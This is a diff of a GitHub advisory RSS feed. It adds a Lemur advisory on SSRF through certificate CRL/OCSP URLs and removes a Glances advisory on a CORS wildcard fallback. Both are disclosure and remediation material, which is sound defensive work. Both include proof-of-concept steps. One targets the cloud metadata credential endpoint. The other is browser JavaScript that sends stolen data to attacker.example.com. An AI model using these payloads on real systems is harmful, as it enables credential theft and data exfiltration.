@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-25T20:26:08.546Z</updated>
+    <updated>2026-06-25T22:00:44.541Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,121 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[lemur] Lemur: Crafted CRL/OCSP URLs in uploaded certificates lead to post-authentication SSRF]]></title>
+        <id>https://github.com/advisories/GHSA-54vg-pfh7-jq95</id>
+        <link href="https://github.com/advisories/GHSA-54vg-pfh7-jq95"/>
+        <updated>2026-06-25T21:58:51.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When verifying an uploaded certificate, <code>lemur/certificates/verify.py</code> extracts the CRL Distribution Point URL and the OCSP responder URL directly from the certificate's extensions and issues outbound requests to those URLs without scheme restriction or destination allow-listing. An authenticated user holding the operator role (required by <code>StrictRolePermission</code> on <code>POST /certificates/upload</code>) can craft a certificate whose extensions point at internal services - instance metadata endpoints, internal Kubernetes API servers, RFC1918 hosts, link-local addresses - and cause the Lemur host to issue requests against those destinations during verification.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>lemur/certificates/verify.py</code>, <code>crl_verify</code>:</p>
+<pre><code class="language-python">point = p.full_name[0].value                          # URL from CDP extension of uploaded cert
+...
+response = requests.get(point, timeout=(3.05, 6))     # no allow-list, no destination filter
+</code></pre>
+<p><code>lemur/certificates/verify.py</code>, <code>ocsp_verify</code>:</p>
+<pre><code class="language-python">command = ["openssl", "x509", "-noout", "-ocsp_uri", "-in", cert_path]
+p1 = subprocess.Popen(command, stdout=subprocess.PIPE, ...)
+url, _ = p1.communicate()
+p2 = subprocess.Popen(
+    ["openssl", "ocsp", "-issuer", issuer_chain_path, "-cert", cert_path,
+     "-url", url.strip()],                            # attacker-controlled URL
+    ...
+)
+</code></pre>
+<p>In both code paths the URL flows from attacker-controlled certificate-extension content to a network sink with no validation against an allow-list of hostnames, no scheme restriction beyond rejecting LDAP via <code>InvalidSchema</code>, and no filtering of RFC1918 / link-local (169.254/16) / loopback / IPv6 ULA destinations.</p>
+<h2 id="affected-endpoints">Affected Endpoints</h2>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Path</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>/api/1/certificates/upload</td>
+<td><code>verify_string</code> → <code>crl_verify</code> / <code>ocsp_verify</code></td>
+</tr>
+</tbody></table>
+<p>The bug additionally surfaces anywhere <code>verify_string</code> is invoked on attacker-influenced certificate content (sync paths, source plugin re-validation, etc.). The upload endpoint is the most direct trigger.</p>
+<h2 id="impact">Impact</h2>
+<p>An operator-role attacker can:</p>
+<ul>
+<li>Probe the Lemur host's internal network through outbound CRL/OCSP fetches and infer topology from response timings and error messages.</li>
+<li>On EC2 instances without IMDSv2 enforcement, cause requests to <code>http://169.254.169.254/</code> and influence downstream behavior of components that parse the response.</li>
+<li>Pin attacker-controlled CRLs into the unbounded module-level <code>crl_cache</code> dict (see Advisory 4c) for permanent cache poisoning - once cached, a poisoned CRL is served to every subsequent verification for the same URL.
+The operator-role precondition reduces severity from what an unauthenticated SSRF would warrant, but operators are still meaningfully less trusted than the host's network position. PKI workflows also routinely process third-party certificates whose extensions are not directly controlled by the operator, broadening the trigger surface beyond purely-malicious operators.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Filter the URL before it reaches the network sink. Either:</p>
+<ol>
+<li>Maintain an explicit allow-list of CRL/OCSP hostnames in configuration (e.g., <code>LEMUR_TRUSTED_CRL_HOSTS</code> and <code>LEMUR_TRUSTED_OCSP_HOSTS</code>) and reject anything outside the list, <strong>or</strong></li>
+<li>Use an SSRF-safe HTTP client wrapper that resolves the destination, rejects RFC1918 / link-local / loopback / IPv6 ULA addresses before connecting, and pins the resolved IP to defeat DNS rebinding.
+For OCSP, route the parsed URL through the same wrapper before passing it as <code>-url</code> to <code>openssl ocsp</code>.</li>
+</ol>
+<p>Additionally, bound <code>crl_cache</code> (see Advisory 4c) to prevent the SSRF vector from amplifying into a persistent cache-poisoning condition.</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<ol>
+<li><p>Set up Lemur on an EC2 instance with IMDSv1 enabled (or any host with reachable RFC1918 services). Create an admin user and an operator-role user <code>eve</code>.</p>
+</li>
+<li><p>Generate a self-signed certificate whose extensions point at internal services:</p>
+<pre><code>cat &gt; openssl.cnf &lt;&lt;EOF
+[req]
+distinguished_name = req_distinguished_name
+req_extensions = v3_ca
+prompt = no
+
+[req_distinguished_name]
+CN = ssrf-poc.example
+
+[v3_ca]
+crlDistributionPoints = URI:http://169.254.169.254/latest/meta-data/iam/security-credentials/
+authorityInfoAccess = OCSP;URI:http://169.254.169.254/latest/meta-data/
+EOF
+
+openssl req -x509 -newkey rsa:2048 -keyout ssrf.key -out ssrf.crt \
+    -days 365 -nodes -config openssl.cnf -extensions v3_ca
+</code></pre>
+</li>
+<li><p>On the Lemur host, start a packet capture filter for the target address before submitting the cert:</p>
+<pre><code>sudo tcpdump -nni any host 169.254.169.254
+</code></pre>
+</li>
+<li><p>As <code>eve</code>, upload the malicious certificate:</p>
+<pre><code>BODY=$(cat ssrf.crt | sed ':a;N;$!ba;s/\n/\\n/g')
+curl -X POST https://lemur.local/api/1/certificates/upload \
+     -H "Authorization: Bearer &lt;eve_jwt&gt;" \
+     -H "Content-Type: application/json" \
+     -d "{
+           \"name\": \"ssrf-poc\",
+           \"body\": \"$BODY\",
+           \"chain\": \"\",
+           \"private_key\": \"\",
+           \"owner\": \"eve@example.com\"
+         }"
+</code></pre>
+</li>
+<li><p>Observe the outbound request to <code>169.254.169.254</code> in the tcpdump output. The request originates from the Lemur process during <code>verify_string</code> processing of the uploaded cert. The attacker has successfully induced a server-side request to an internal address of their choosing.</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-54vg-pfh7-jq95">https://github.com/Netflix/lemur/security/advisories/GHSA-54vg-pfh7-jq95</a></li>
+<li><a href="https://github.com/Netflix/lemur/releases/tag/v1.9.2">https://github.com/Netflix/lemur/releases/tag/v1.9.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-54vg-pfh7-jq95">https://github.com/advisories/GHSA-54vg-pfh7-jq95</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-54vg-pfh7-jq95</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-25T21:58:51.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[lemur] Lemur has an authorization bypass in StrictRolePermission / AuthorityCreatorPermission]]></title>
         <id>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</id>
@@ -1561,196 +1676,5 @@ class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-22T21:31:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances: XML-RPC Multi-Origin CORS Configuration Silently Falls Back to Wildcard (Incomplete Fix for CVE-2026-33533)]]></title>
-        <id>https://github.com/advisories/GHSA-87qc-fj39-wccr</id>
-        <link href="https://github.com/advisories/GHSA-87qc-fj39-wccr"/>
-        <updated>2026-06-22T21:27:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Glances XML-RPC server (<code>glances -s</code>) introduced a configurable CORS origin list in version 4.5.3 as a mitigation for CVE 2026-33533.  However, the implementation silently falls back to <code>Access-Control-Allow-Origin: *</code> whenever <code>cors_origins</code> contains more than one entry.  An operator who configures an explicit two-entry allowlist (e.g. two internal dashboard origins) intending to restrict browser access instead receives the unrestricted wildcard — the same exposure that the original CVE described.  A malicious web page served from any origin can issue a CORS simple request to <code>/RPC2</code> and read the full system monitoring dataset without the victim's knowledge.</p>
-<hr>
-<h3 id="details">Details</h3>
-<p><strong>Affected file:</strong> <code>glances/server.py</code>, class <code>GlancesXMLRPCServer</code>, line 113</p>
-<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113</a></li>
-</ul>
-<pre><code class="language-python"># server.py  (GlancesXMLRPCServer.__init__)
-cors_origins = self.args.cors_origins   # list from config / CLI
-
-# Line 113 — the incomplete fix:
-self.cors_origin = cors_origins[0] if len(cors_origins) == 1 else '*'
-#                                                                  ^^^
-# Any allowlist with 2+ entries collapses to the wildcard
-</code></pre>
-<p>The <code>cors_origin</code> value is then echoed back as the <code>Access-Control-Allow-Origin</code> response header for every request (line ~147 in the same file):</p>
-<pre><code class="language-python">self.send_header('Access-Control-Allow-Origin', self.cors_origin)
-</code></pre>
-<p>This means the CORS header is determined once at server startup and never compared against the actual <code>Origin</code> header sent by the browser.  Even if an operator sets:</p>
-<pre><code class="language-ini"># glances.conf
-[outputs]
-cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
-</code></pre>
-<p>the server responds with <code>Access-Control-Allow-Origin: *</code> to every request, including those from <code>https://attacker.example.com</code>.</p>
-<p><strong>Single-origin wildcard</strong> (the default, <code>cors_origins = *</code>) is also still in effect; the fix only helps if exactly one non-wildcard origin is configured.</p>
-<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
-<p>Test results:</p>
-<table>
-<thead>
-<tr>
-<th>Origin sent</th>
-<th>ACAO header returned</th>
-<th>Expected</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>http://evil.example.com</code></td>
-<td><code>*</code></td>
-<td>No header</td>
-</tr>
-<tr>
-<td><code>https://dashboard.corp</code></td>
-<td><code>*</code></td>
-<td>Reflected</td>
-</tr>
-<tr>
-<td><code>https://grafana.corp</code></td>
-<td><code>*</code></td>
-<td>Reflected</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="poc">PoC</h3>
-<p><strong>Special configuration required</strong></p>
-<p>The multi-origin collapse is only triggered when <code>cors_origins</code> contains two or more entries.  Create the following <code>glances.conf</code>:</p>
-<pre><code class="language-ini"># /tmp/glances_multiorigin.conf
-[global]
-check_update = false
-
-[outputs]
-cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
-</code></pre>
-<p><strong>Step 1 — Start the XML-RPC server using the config above</strong></p>
-<pre><code class="language-bash">glances -s -p 61209 -C /tmp/glances_multiorigin.conf
-</code></pre>
-<p><strong>Step 2 — Send a CORS simple request from a foreign origin</strong></p>
-<pre><code class="language-bash">curl -s -D - -X POST "http://TARGET_HOST:61209/RPC2" \
-     -H "Content-Type: text/plain" \
-     -H "Origin: http://evil.example.com" \
-     -d '&lt;?xml version="1.0"?&gt;
-         &lt;methodCall&gt;&lt;methodName&gt;getAllPlugins&lt;/methodName&gt;&lt;/methodCall&gt;'
-</code></pre>
-<p><strong>Expected (secure) response:</strong></p>
-<pre><code>HTTP/1.0 400 Bad Request
-</code></pre>
-<p>or no <code>Access-Control-Allow-Origin</code> header.</p>
-<p><strong>Actual response:</strong></p>
-<pre><code>HTTP/1.0 200 OK
-Access-Control-Allow-Origin: *
-...
-&lt;?xml version='1.0'?&gt;
-&lt;methodResponse&gt;
-  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
-    &lt;value&gt;&lt;string&gt;cpu&lt;/string&gt;&lt;/value&gt;
-    &lt;value&gt;&lt;string&gt;mem&lt;/string&gt;&lt;/value&gt;
-    ...
-  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
-&lt;/methodResponse&gt;
-</code></pre>
-<p><strong>Step 3 — Demonstrate the code-level collapse to wildcard</strong></p>
-<pre><code class="language-python">import sys
-sys.path.insert(0, '/path/to/glances')   # adjust to local clone
-from glances.config import Config
-
-c = Config('/tmp/glances_multiorigin.conf')
-cors_list = c.get_list_value('outputs', 'cors_origins', default=['*'])
-# Reproduces server.py line 113:
-result = cors_list[0] if len(cors_list) == 1 else '*'
-
-print('cors_origins config :', cors_list)
-print('cors_origin applied :', result)
-print('Is wildcard?        :', result == '*')
-# cors_origins config : ['https://dashboard.corp.example.com', 'https://grafana.corp.example.com']
-# cors_origin applied : *
-# Is wildcard?        : True
-</code></pre>
-<p><strong>Browser-based exploitation</strong></p>
-<p>Once the wildcard is confirmed, the original CVE-2026-33533 attack vector still applies in full.  A malicious page served to a victim whose browser can reach the Glances server can exfiltrate data as follows:</p>
-<pre><code class="language-javascript">// Runs in a page on http://evil.example.com
-const payload = `&lt;?xml version="1.0"?&gt;
-  &lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;`;
-
-fetch('http://GLANCES_HOST:61209/RPC2', {
-  method: 'POST',
-  headers: { 'Content-Type': 'text/plain' },
-  body: payload,
-})
-.then(r =&gt; r.text())
-.then(data =&gt; {
-  // 'data' contains hostname, OS, full process list, network interfaces, etc.
-  fetch('https://attacker.example.com/collect?d=' + btoa(data));
-});
-</code></pre>
-<p>This works as a CORS "simple request" (POST + <code>text/plain</code>) — no CORS preflight is triggered and the <code>*</code> wildcard allows the browser to read the response.</p>
-<hr>
-<h3 id="impact">Impact</h3>
-<p><strong>Vulnerability type:</strong> CORS Misconfiguration / Bypass of CVE-2026-33533 mitigation (CWE-942)</p>
-<p><strong>Who is impacted:</strong> Any operator who:</p>
-<ol>
-<li>Runs Glances in XML-RPC server mode (<code>glances -s</code>), <em>and</em></li>
-<li>Has configured two or more <code>cors_origins</code> entries in <code>glances.conf</code> believing
-they are restricting browser access.</li>
-</ol>
-<p>Operators using the default single-wildcard configuration (<code>cors_origins = *</code>, which is the upstream default) remain affected by the original CVE-2026-33533 exposure (unrestricted cross-origin read).  The incomplete fix addresses only the narrow case of a single non-wildcard origin.</p>
-<p><strong>Data exposed through the XML-RPC API</strong> includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, passwords, and tokens), CPU/memory/disk/network statistics, listening ports, and Docker/Kubernetes container metadata.</p>
-<p><strong>Impact:</strong></p>
-<ul>
-<li><strong>Confidentiality:</strong> High — complete system monitoring data readable by any browser page.</li>
-<li><strong>Integrity:</strong> None — read-only API.</li>
-<li><strong>Availability:</strong> None — no denial-of-service component.</li>
-</ul>
-<hr>
-<h3 id="suggested-fix">Suggested Fix</h3>
-<p>Implement per-request origin reflection against the configured allowlist, as recommended by the W3C CORS specification and as done by modern CORS middleware (e.g. Starlette's <code>CORSMiddleware</code>):</p>
-<pre><code class="language-python"># server.py  — replace the single static self.cors_origin field with:
-
-def _get_acao_header(self, request_origin: str) -&gt; str | None:
-    """Return the correct Access-Control-Allow-Origin value or None."""
-    if not self.cors_origins or '*' in self.cors_origins:
-        return '*'
-    if request_origin in self.cors_origins:
-        return request_origin
-    return None   # do not send the header for unlisted origins
-
-# In do_POST / send_response:
-origin = self.headers.get('Origin', '')
-acao   = self._get_acao_header(origin)
-if acao:
-    self.send_header('Access-Control-Allow-Origin', acao)
-    self.send_header('Vary', 'Origin')
-</code></pre>
-<p>Additionally, consider retiring the legacy XML-RPC server in favour of the REST API (<code>glances -w</code>), which uses Starlette's <code>CORSMiddleware</code> correctly, and document the deprecation path.</p>
-<hr>
-<h3 id="responsible-disclosure">Responsible Disclosure</h3>
-<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
-<hr>
-<h3 id="credits">Credits</h3>
-<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr">https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-87qc-fj39-wccr">https://github.com/advisories/GHSA-87qc-fj39-wccr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-87qc-fj39-wccr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-22T21:27:24.000Z</published>
     </entry>
 </feed>
